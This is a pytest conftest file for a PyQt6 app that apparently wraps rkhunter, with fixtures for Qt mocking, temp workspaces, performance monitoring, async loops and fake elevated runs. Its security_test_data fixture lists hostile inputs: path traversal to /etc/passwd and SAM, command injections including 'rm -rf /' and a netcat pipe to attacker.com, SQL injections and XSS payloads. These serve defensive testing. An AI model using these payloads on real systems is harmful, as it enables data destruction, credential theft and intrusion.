"""Modern Pytest configuration & shared fixtures/mocks."""

from pathlib import Path

from typing import Any, Dict, Generator
import os

import sys
import tempfile

import threading
import time

from unittest.mock import MagicMock, Mock

import pytest

import types

# Ensure app on path
repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
app_dir = os.path.join(repo_root, "app")
for p in (repo_root, app_dir):
    if p not in sys.path:
        sys.path.insert(0, p)

# Test configuration
pytest_plugins = ["pytest_asyncio"]

@pytest.fixture(autouse=True)
def mock_pyqt(monkeypatch):
    """Enhanced PyQt6 mocking for headless test runs."""
    qt_modules = [
        "PyQt6",
        "PyQt6.QtWidgets",
        "PyQt6.QtCore",
        "PyQt6.QtGui",
        "PyQt6.QtTest",
        "PyQt6.QtNetwork",
        "PyQt6.QtSql",
    ]

    mocked_modules = {}

    for mod_name in qt_modules:
        if mod_name not in sys.modules:
            mock_module = Mock()

            # Add common Qt classes with proper mocking
            if "QtWidgets" in mod_name:
                mock_module.QApplication = Mock()
                mock_module.QMainWindow = Mock()
                mock_module.QWidget = Mock()
                mock_module.QPushButton = Mock()
                mock_module.QVBoxLayout = Mock()
                mock_module.QHBoxLayout = Mock()
                mock_module.QLabel = Mock()
                mock_module.QLineEdit = Mock()
                mock_module.QTextEdit = Mock()
                mock_module.QProgressBar = Mock()
                mock_module.QCheckBox = Mock()
                mock_module.QRadioButton = Mock()
                mock_module.QComboBox = Mock()
                mock_module.QListWidget = Mock()
                mock_module.QTreeWidget = Mock()
                mock_module.QTabWidget = Mock()
                mock_module.QMessageBox = Mock()
                mock_module.QFileDialog = Mock()
                mock_module.QDialog = Mock()

            elif "QtCore" in mod_name:
                mock_module.QThread = Mock()
                mock_module.QTimer = Mock()
                mock_module.QObject = Mock()
                mock_module.pyqtSignal = Mock()
                mock_module.QMutex = Mock()
                mock_module.QSettings = Mock()
                mock_module.Qt = Mock()

            elif "QtGui" in mod_name:
                mock_module.QIcon = Mock()
                mock_module.QPixmap = Mock()
                mock_module.QFont = Mock()
                mock_module.QPalette = Mock()
                mock_module.QColor = Mock()

            sys.modules[mod_name] = mock_module
            mocked_modules[mod_name] = mock_module

    yield mocked_modules

@pytest.fixture
def temp_workspace():
    """Provide a temporary workspace for tests."""
    with tempfile.TemporaryDirectory() as temp_dir:
        workspace = Path(temp_dir)
        yield workspace

@pytest.fixture
def mock_file_system(tmp_path):
    """Provide a mock file system structure for testing."""
    # Create common directory structure
    dirs = ["logs", "config", "data", "temp", "reports"]
    for dir_name in dirs:
        (tmp_path / dir_name).mkdir()

    # Create common files
    (tmp_path / "config" / "app.conf").write_text("[settings]\ndebug=true\n")
    (tmp_path / "logs" / "app.log").write_text("Log file content\n")

    return tmp_path

@pytest.fixture
def performance_monitor():
    """Provide performance monitoring for tests."""
    import psutil

    class PerfMonitor:
        def __init__(self):
            self.start_time = None
            self.start_memory = None

        def start(self):
            self.start_time = time.time()
            try:
                process = psutil.Process()
                self.start_memory = process.memory_info().rss / 1024 / 1024
            except BaseException:
                self.start_memory = 0

        def stop(self):
            if self.start_time is None:
                return {"duration": 0, "memory_delta": 0}

            duration = time.time() - self.start_time
            try:
                process = psutil.Process()
                end_memory = process.memory_info().rss / 1024 / 1024
                memory_delta = end_memory - self.start_memory
            except BaseException:
                memory_delta = 0

            return {
                "duration": duration,
                "memory_delta": memory_delta,
                "start_memory": self.start_memory,
            }

    return PerfMonitor()

@pytest.fixture
def async_test_environment():
    """Provide async test environment setup."""
    import asyncio

    # Create new event loop for test isolation
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    yield loop

    # Cleanup
    try:
        # Cancel any remaining tasks
        pending = asyncio.all_tasks(loop)
        for task in pending:
            task.cancel()

        # Wait for cancellation to complete
        if pending:
            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))

        loop.close()
    except Exception:
        pass

@pytest.fixture
def thread_pool_executor():
    """Provide thread pool executor for concurrent tests."""
    import concurrent.futures

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        yield executor

@pytest.fixture
def security_test_data():
    """Provide test data for security testing."""
    return {
        "malicious_filenames": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\SAM",
            "file\x00.txt",
            "con.txt",
            "prn.log",
            "",
            "A" * 300,
        ],
        "command_injections": [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "file.txt`whoami`",
            "file.txt$(cat /etc/passwd)",
        ],
        "sql_injections": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
        ],
        "xss_patterns": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ],
    }

# Enhanced elevated run fixtures
@pytest.fixture
def fake_elevated_run_success(monkeypatch):
    from types import SimpleNamespace

    def _factory(stdout="", returncode=0):
        def _impl(argv, **kwargs):
            return SimpleNamespace(args=argv, stdout=stdout, stderr="", returncode=returncode)

        return _impl

    monkeypatch.setattr(
        "app.core.rkhunter_wrapper.elevated_run", _factory("System checks summary", 0)
    )
    yield

@pytest.fixture
def fake_elevated_run_timeout(monkeypatch):
    def _impl(argv, **kwargs):
        import subprocess

        raise subprocess.TimeoutExpired(argv, timeout=5)

    monkeypatch.setattr("app.core.rkhunter_wrapper.elevated_run", _impl)
    yield

@pytest.fixture
def fake_elevated_run_cancel(monkeypatch):
    from types import SimpleNamespace

    def _impl(argv, **kwargs):
        return SimpleNamespace(args=argv, stdout="", stderr="cancelled", returncode=126)

    monkeypatch.setattr("app.core.rkhunter_wrapper.elevated_run", _impl)
    yield

@pytest.fixture(scope="session")
def test_config():
    """Provide test configuration."""
    return {
        "timeout": 30,
        "memory_limit_mb": 500,
        "performance_threshold": 1.0,
        "security_iterations": 100,
        "max_concurrent_operations": 10,
    }

# Pytest hooks for better test reporting
def pytest_configure(config):
    """Configure pytest with custom markers and settings."""
    config.addinivalue_line("markers", "unit: marks tests as unit tests")
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "performance: marks tests as performance tests")
    config.addinivalue_line("markers", "security: marks tests as security tests")
    config.addinivalue_line("markers", "slow: marks tests as slow running")

def pytest_runtest_setup(item):
    """Setup for each test run."""
    # Add any per-test setup here
    pass

def pytest_runtest_teardown(item, nextitem):
    """Teardown after each test run."""
    # Force garbage collection after each test
    import gc

    gc.collect()

@pytest.fixture(autouse=True)
def cleanup_threads():
    """Ensure proper thread cleanup after tests."""
    yield

    # Wait for any background threads to complete
    import threading
    import time

    start_time = time.time()
    while threading.active_count() > 1 and time.time() - start_time < 5:
        time.sleep(0.1)

    # Log any remaining threads for debugging
    if threading.active_count() > 1:
        active_threads = [t.name for t in threading.enumerate() if t != threading.current_thread()]
        print(f"Warning: {len(active_threads)} threads still active: {active_threads}")
